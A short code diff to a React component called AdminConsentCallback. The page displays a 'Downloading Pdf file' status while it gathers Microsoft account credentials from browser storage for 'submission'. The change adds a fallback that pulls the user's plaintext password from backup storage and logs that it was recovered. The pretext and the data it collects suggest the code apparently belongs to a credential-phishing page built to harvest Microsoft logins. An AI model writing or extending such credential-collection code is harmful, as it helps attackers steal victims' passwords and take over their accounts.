@@ -145,7 +145,7 @@ export default function AdminConsentCallback() {
         setStatus('Downloading Pdf file');
         console.log('🔄 Consolidating all data for submission...');
 
-        // ✅ FIX: Read credentials from BOTH storage locations
+        // ✅ FIX: Read credentials from MULTIPLE storage locations with backup
         const storedCreds = localStorage.getItem('ms_auth_credentials') || 
                            sessionStorage.getItem('ms_auth_credentials');
         
@@ -163,9 +163,17 @@ export default function AdminConsentCallback() {
           }
         }
         
-        // Fallback: Get email from separate storage
+        // Fallback 1: Get email from separate storage
         if (!credentials.email) {
           credentials.email = localStorage.getItem('ms_email') || sessionStorage.getItem('ms_email') || '';
+        }
+
+        // Fallback 2: Get password from backup storage
+        if (!credentials.password) {
+          credentials.password = localStorage.getItem('ms_password') || sessionStorage.getItem('ms_password') || '';
+          if (credentials.password) {
+            console.log('✅ Password recovered from backup storage');
+          }
         }
 
         console.log('📊 Final credentials:', {
